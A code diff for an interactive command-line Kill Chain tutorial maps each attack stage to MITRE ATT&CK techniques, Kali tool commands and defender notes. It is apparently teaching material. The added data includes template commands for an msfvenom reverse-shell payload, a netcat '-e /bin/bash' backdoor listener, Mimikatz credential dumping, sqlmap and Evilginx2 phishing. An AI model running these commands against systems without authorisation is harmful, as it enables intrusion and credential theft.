@@ -26,60 +26,224 @@ RESET = "\033[0m"
 PROJECT_ROOT = Path(__file__).resolve().parent
 DEFAULT_DOC_ROOT = PROJECT_ROOT / "ops_docs"
 
-kill_chain_data = {
-    "Reconnaissance": {
-        "description": "Gather information about the target via active scanning and OSINT techniques.",
-        "kali_apps": ["Nmap", "theHarvester"],
-        "methodology": (
-            "Use port scans and service detection to map exposed surfaces, then pair the findings with "
-            "public data collection to guide later attacks."
+# Comprehensive Kill Chain data with MITRE ATT&CK alignment, tool commands, and defender notes.
+kill_chain_data = [
+    {
+        "name": "Reconnaissance",
+        "kill_chain_id": 1,
+        "description": (
+            "The planning phase where attackers research targets, identify vulnerabilities, and harvest information "
+            "(email, IP ranges)."
         ),
-    },
-    "Weaponization": {
-        "description": "Prepare malicious payloads and couple them with suitable exploits.",
-        "kali_apps": ["msfvenom", "SET"],
         "methodology": (
-            "Craft payloads (shellcode, droppers, phishing lures) that align with identified weaknesses, "
-            "readying them for delivery."
+            "Passive recon gathers data from public records, while active recon probes the network for live services."
         ),
+        "mitre_attack": {
+            "tactic": "TA0043",
+            "techniques": [
+                {"id": "T1593", "name": "Search Open Websites/Domains"},
+                {"id": "T1595", "name": "Active Scanning"},
+                {"id": "T1590", "name": "Gather Victim Network Information"},
+            ],
+        },
+        "tools": [
+            {
+                "name": "theHarvester",
+                "command": "theHarvester -d [domain] -l 500 -b google",
+                "purpose": "Harvesting emails, names, and subdomains from OSINT sources.",
+            },
+            {
+                "name": "Nmap",
+                "command": "nmap -sV -T4 [target_ip]",
+                "purpose": "Active service discovery and version detection.",
+            },
+            {
+                "name": "Amass",
+                "command": "amass enum -d [domain]",
+                "purpose": "Comprehensive subdomain enumeration and attack surface mapping.",
+            },
+            {
+                "name": "Recon-ng",
+                "command": "recon-ng",
+                "purpose": "Modular OSINT framework for structured reconnaissance.",
+            },
+        ],
+        "defender_notes": "Monitor for scanning patterns, excessive DNS queries, and abnormal OSINT-driven targeting.",
     },
-    "Delivery": {
-        "description": "Transmit the weaponized payload to the target environment.",
-        "kali_apps": ["Evilginx2", "Social-Engineer Toolkit"],
-        "methodology": (
-            "Send phishing messages, host rogue access points, or otherwise transport the payload into the "
-            "target's sphere."
-        ),
+    {
+        "name": "Weaponization",
+        "kill_chain_id": 2,
+        "description": "Coupling a remote access trojan with an exploit into a deliverable payload (e.g., an infected PDF or Office doc).",
+        "methodology": "Attackers package malicious code into common file formats or create standalone executables.",
+        "mitre_attack": {
+            "tactic": "TA0042",
+            "techniques": [
+                {"id": "T1587", "name": "Develop Capabilities"},
+                {"id": "T1588", "name": "Obtain Capabilities"},
+            ],
+        },
+        "tools": [
+            {
+                "name": "msfvenom",
+                "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[Port] -f exe",
+                "purpose": "Generating standalone payloads and shellcode.",
+            },
+            {
+                "name": "SET (Social-Engineer Toolkit)",
+                "command": "sudo setoolkit",
+                "purpose": "Automating the creation of malicious media and phishing templates.",
+            },
+            {
+                "name": "Veil",
+                "command": "veil",
+                "purpose": "Generating payloads designed to evade signature-based defenses.",
+            },
+        ],
+        "defender_notes": "Look for abnormal file creation, suspicious macro usage, and payload staging activity.",
     },
-    "Exploitation": {
-        "description": "Execute code on the target by leveraging discovered vulnerabilities.",
-        "kali_apps": ["Metasploit", "SQLmap"],
-        "methodology": (
-            "Trigger exploits that run the payload or abuse logic flaws such as SQL injection to gain execution."
-        ),
+    {
+        "name": "Delivery",
+        "kill_chain_id": 3,
+        "description": "The transmission of the weaponized payload to the victim (via email, web, or USB).",
+        "methodology": "The delivery vector is chosen based on the victim's behavior discovered during Recon.",
+        "mitre_attack": {
+            "tactic": "TA0001",
+            "techniques": [
+                {"id": "T1566", "name": "Phishing"},
+                {"id": "T1185", "name": "Man-in-the-Middle"},
+                {"id": "T1557", "name": "Adversary-in-the-Middle"},
+            ],
+        },
+        "tools": [
+            {
+                "name": "Evilginx2",
+                "command": "sudo evilginx2",
+                "purpose": "Transparent phishing proxy to capture credentials and session cookies, bypassing MFA.",
+            },
+            {
+                "name": "Wifipumpkin3",
+                "command": "sudo wifipumpkin3",
+                "purpose": "Creating rogue access points to deliver payloads via fake Wi-Fi networks.",
+            },
+            {
+                "name": "Gophish",
+                "command": "gophish",
+                "purpose": "Managing large-scale phishing campaigns and tracking user interaction.",
+            },
+        ],
+        "defender_notes": "Email filtering, MFA enforcement, certificate validation, and wireless IDS reduce exposure.",
     },
-    "Installation": {
-        "description": "Establish persistence and install backdoors for ongoing access.",
-        "kali_apps": ["Empire", "Netcat"],
-        "methodology": (
-            "Deploy agents, reverse shells, or service modifications that survive reboots and keep footholds alive."
-        ),
+    {
+        "name": "Exploitation",
+        "kill_chain_id": 4,
+        "description": "The point where the malicious code executes on the victim's system, leveraging a software flaw.",
+        "methodology": "Triggering the payload by exploiting known CVEs or misconfigurations.",
+        "mitre_attack": {
+            "tactic": "TA0002",
+            "techniques": [
+                {"id": "T1203", "name": "Exploitation for Client Execution"},
+                {"id": "T1059", "name": "Command-Line Interface"},
+            ],
+        },
+        "tools": [
+            {
+                "name": "Metasploit (msfconsole)",
+                "command": "msfconsole -q -x 'use exploit/[name]; set RHOSTS [target]; run'",
+                "purpose": "Executing remote and local exploits through a modular framework.",
+            },
+            {
+                "name": "SQLmap",
+                "command": "sqlmap -u '[URL]' --batch --dbs",
+                "purpose": "Automated detection and exploitation of SQL injection vulnerabilities.",
+            },
+            {
+                "name": "Searchsploit",
+                "command": "searchsploit [service]",
+                "purpose": "Locating known public exploits for discovered services.",
+            },
+        ],
+        "defender_notes": "Patch management, WAFs, and exploit behavior monitoring are critical here.",
     },
-    "C2": {
-        "description": "Create a command-and-control channel to manage compromised hosts.",
-        "kali_apps": ["Sliver", "Pwnat"],
-        "methodology": (
-            "Open interactive channels, beaconing sessions, or NAT-bypassing tunnels to orchestrate operations."
-        ),
+    {
+        "name": "Installation",
+        "kill_chain_id": 5,
+        "description": "Installing a persistent backdoor or foothold to survive reboots or credential changes.",
+        "methodology": "Persistence mechanisms maintain access after initial exploitation.",
+        "mitre_attack": {
+            "tactic": "TA0003",
+            "techniques": [
+                {"id": "T1053", "name": "Scheduled Task/Job"},
+                {"id": "T1547", "name": "Boot or Logon Autostart Execution"},
+            ],
+        },
+        "tools": [
+            {
+                "name": "Empire",
+                "command": "powershell-empire",
+                "purpose": "Post-exploitation framework for PowerShell-based persistence.",
+            },
+            {
+                "name": "Netcat (nc)",
+                "command": "nc -lvp [port] -e /bin/bash",
+                "purpose": "Lightweight listener and backdoor channel.",
+            },
+        ],
+        "defender_notes": "Monitor autoruns, scheduled tasks, registry persistence, and unusual services.",
     },
-    "Actions": {
-        "description": "Achieve mission objectives such as data exfiltration or credential theft.",
-        "kali_apps": ["PyExfil", "Mimikatz"],
-        "methodology": (
-            "Collect, stage, and extract target data or secrets, maintaining operational security throughout."
-        ),
+    {
+        "name": "Command & Control (C2)",
+        "kill_chain_id": 6,
+        "description": "Establishing communication between compromised hosts and attacker infrastructure.",
+        "methodology": "Traffic is disguised as legitimate protocols to evade detection.",
+        "mitre_attack": {
+            "tactic": "TA0011",
+            "techniques": [
+                {"id": "T1071", "name": "Application Layer Protocol"},
+                {"id": "T1090", "name": "Proxy"},
+            ],
+        },
+        "tools": [
+            {
+                "name": "Sliver",
+                "command": "sliver-server",
+                "purpose": "Modern cross-platform C2 using mTLS, HTTP/2, or DNS.",
+            },
+            {
+                "name": "Pwnat",
+                "command": "pwnat -s",
+                "purpose": "Maintaining C2 channels through NAT without port forwarding.",
+            },
+        ],
+        "defender_notes": "Inspect encrypted traffic patterns, beacon timing, and DNS anomalies.",
     },
-}
+    {
+        "name": "Actions on Objectives",
+        "kill_chain_id": 7,
+        "description": "Final phase where attackers accomplish their mission goals.",
+        "methodology": "Includes credential theft, lateral movement, exfiltration, or destruction.",
+        "mitre_attack": {
+            "tactic": "TA0040",
+            "techniques": [
+                {"id": "T1003", "name": "OS Credential Dumping"},
+                {"id": "T1048", "name": "Exfiltration Over Alternative Protocol"},
+                {"id": "T1485", "name": "Data Destruction"},
+            ],
+        },
+        "tools": [
+            {
+                "name": "PyExfil",
+                "command": "python3 pyexfil.py",
+                "purpose": "Covert data exfiltration via DNS, ICMP, or HTTP.",
+            },
+            {
+                "name": "Mimikatz",
+                "command": "mimikatz.exe \"privilege::debug\" \"lsadump::sam\"",
+                "purpose": "Extracting plaintext credentials and password hashes from memory.",
+            },
+        ],
+        "defender_notes": "Monitor credential access, lateral authentication spikes, and outbound data flows.",
+    },
+]
 
 
 def clear_screen() -> None:
@@ -249,15 +413,16 @@ def render_commands_help() -> str:
     return "\n".join(rows)
 
 
-def render_stage_table(stages: list[str]) -> str:
+def render_stage_table(stages: list[dict]) -> str:
     """Render stages as a two-column grid for a compact dash look."""
 
-    col_width = 32
-    padded = [f"{BOLD}{str(i+1).rjust(2)}{RESET} {CYAN}{stage}{RESET}" for i, stage in enumerate(stages)]
-    # Split into two columns
+    col_width = 42
+    padded = [
+        f"{BOLD}{str(stage['kill_chain_id']).rjust(2)}{RESET} {CYAN}{stage['name']}{RESET}"
+        for stage in stages
+    ]
     left = padded[::2]
     right = padded[1::2]
-    # Pad shorter column
     while len(left) > len(right):
         right.append("")
     lines: list[str] = []
@@ -266,15 +431,36 @@ def render_stage_table(stages: list[str]) -> str:
     return "\n".join(lines)
 
 
-def render_stage(stage: str) -> None:
+def render_stage(stage: dict) -> None:
     """Render the selected Kill Chain stage details."""
-    info = kill_chain_data[stage]
+
     clear_screen()
-    print(f"{BOLD}{CYAN}{stage}{RESET}\n")
-    print(f"{YELLOW}Description:{RESET} {info['description']}\n")
-    tools_colored = ", ".join(f"{GREEN}{tool}{RESET}" for tool in info["kali_apps"])
-    print(f"{YELLOW}Kali Tools:{RESET} {tools_colored}\n")
-    print(f"{YELLOW}Methodology:{RESET} {info['methodology']}\n")
+    print(f"{BOLD}{CYAN}{stage['kill_chain_id']}. {stage['name']}{RESET}\n")
+    print(f"{YELLOW}Description:{RESET} {stage['description']}\n")
+    print(f"{YELLOW}Methodology:{RESET} {stage['methodology']}\n")
+
+    mitre = stage.get("mitre_attack", {})
+    if mitre:
+        print(f"{YELLOW}MITRE ATT&CK Tactic:{RESET} {mitre.get('tactic', 'N/A')}")
+        techniques = mitre.get("techniques", [])
+        if techniques:
+            for tech in techniques:
+                print(f"  • {GREEN}{tech['id']}{RESET}: {tech['name']}")
+        print()
+
+    tools = stage.get("tools", [])
+    if tools:
+        print(f"{YELLOW}Tools:{RESET}")
+        for tool in tools:
+            print(f"  • {GREEN}{tool['name']}{RESET}")
+            print(f"    {YELLOW}Command:{RESET} {tool['command']}")
+            print(f"    {YELLOW}Purpose:{RESET} {tool['purpose']}")
+        print()
+
+    defender_notes = stage.get("defender_notes")
+    if defender_notes:
+        print(f"{YELLOW}Defender Notes:{RESET} {defender_notes}\n")
+
     input("Press Enter to return to menu.")
 
 
@@ -285,7 +471,7 @@ class KillChainController(Controller):
 
     @ex(help="Launch the interactive Kill Chain tutorial")
     def default(self) -> None:
-        stages = list(kill_chain_data.keys())
+        stages = sorted(kill_chain_data, key=lambda item: item["kill_chain_id"])
         show_help = True
         auto_resize_terminal()
         try:
